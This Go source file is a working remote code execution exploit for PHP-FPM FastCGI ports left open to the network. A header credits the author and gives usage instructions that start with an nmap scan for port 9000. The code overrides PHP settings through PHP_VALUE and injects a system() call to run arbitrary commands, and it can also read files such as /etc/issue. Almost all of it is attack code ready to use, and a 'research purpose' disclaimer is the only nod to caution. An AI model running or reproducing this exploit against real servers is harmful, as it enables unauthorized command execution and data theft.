/* PHP FactCGI Remote Code Execute Exploit
* Date: 2012-09-15
* Author: wofeiwo@80sec.com
* Affected: All PHP-FPM exposed outsie, but "system" cmd only affects >=5.3.3
* !!Note: Only for research purpose!!
* Usage:
* First use nmap.
* $nmap -sV -p 9000 --open xxx.xxx.xxx.xxx/24
* Find any open port marked as "tcpwrapped".
* $go build fcgi_exp.go
* $./fcgi_exp read xxx.xxx.xxx.xxx 9000 /etc/issue
* X-Powered-By: PHP/5.3.2-1ubuntu4.9
* Content-type: text/html
* 
* Ubuntu 10.04.3 LTS \n \l
 */

package main

import (
	"./fcgiclient"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func usage(name string) {
	fmt.Printf("--------------------------------\n")
	fmt.Printf("PHP Fastcgi Remote Code Execute Exploit.\n")
	fmt.Printf("Date: 2012-09-15\n")
	fmt.Printf("Author: wofeiwo@80sec.com\n")
	fmt.Printf("Note: Only for research purpose\n")
	fmt.Printf("--------------------------------\n\n")
	fmt.Printf("Usage:   %s <cmd> <ip> <port> <file> [command]\n", name)
	fmt.Printf("\t cmd: phpinfo, system, read\n")
	fmt.Printf("\t      the SYSTEM cmd only affects PHP-FPM >= 5.3.3\n")
	fmt.Printf("\t ip: Target ip to exploit with.\n")
	fmt.Printf("\t port: Target port running php-fpm.\n")
	fmt.Printf("\t file: File to read or execute.\n")
	fmt.Printf("\t command: Command to execute by system. Must use with cmd 'system'.\n\n")
	fmt.Printf("Example: %s system 127.0.0.1 9000 /var/www/html/index.php \"whoami\"\n", name)
	fmt.Printf("\t %s phpinfo 127.0.0.1 9000 /var/www/html/index.php > phpinfo.html\n", name)
	fmt.Printf("\t %s read 127.0.0.1 9000 /etc/issue\n", name)
	os.Exit(-1)
}

func main() {

	var cmd, ip, url, reqParams string
	var port int
	var cutLine = "-----0vcdb34oju09b8fd-----\n"

	if len(os.Args) < 5 {
		usage(os.Args[0])
	} else {
		cmd = os.Args[1]
		ip = os.Args[2]
		p, err1 := strconv.Atoi(os.Args[3])
		url = os.Args[4]

		if err1 != nil {
			usage(os.Args[0])
		}

		port = p
	}

	switch {
	case strings.ToLower(cmd) == "phpinfo":
		reqParams = "<?php phpinfo();die('" + cutLine + "');?>"
	case strings.ToLower(cmd) == "system":
		if len(os.Args) != 6 {
			usage(os.Args[0])
		} else {
			reqParams = "<?php system('" + os.Args[5] + "');die('" + cutLine + "');?>"
		}
	case strings.ToLower(cmd) == "read":
		reqParams = ""
	default:
		usage(os.Args[0])
	}

	env := make(map[string]string)

	env["SCRIPT_FILENAME"] = url
	env["DOCUMENT_ROOT"] = "/"
	env["SERVER_SOFTWARE"] = "go / fcgiclient "
	env["REMOTE_ADDR"] = "127.0.0.1"
	env["SERVER_PROTOCOL"] = "HTTP/1.1"

	if len(reqParams) != 0 {
		env["CONTENT_LENGTH"] = strconv.Itoa(len(reqParams))
		env["REQUEST_METHOD"] = "POST"
		env["PHP_VALUE"] = "allow_url_include = On\ndisable_functions = \nsafe_mode = Off\nauto_prepend_file = php://input"
	} else {
		env["REQUEST_METHOD"] = "GET"
	}

	fcgi, err := fcgiclient.New(ip, port)
	if err != nil {
		fmt.Printf("err: %v", err)
	}

	stdout, stderr, err := fcgi.Request(env, reqParams)
	if err != nil {
		fmt.Printf("err: %v", err)
	}

	if strings.Contains(string(stdout), cutLine) {
		stdout = []byte(strings.SplitN(string(stdout), cutLine, 2)[0])
	}

	fmt.Printf("%s", stdout)
	if len(stderr) > 0 {
		fmt.Printf("%s", stderr)
	}
}
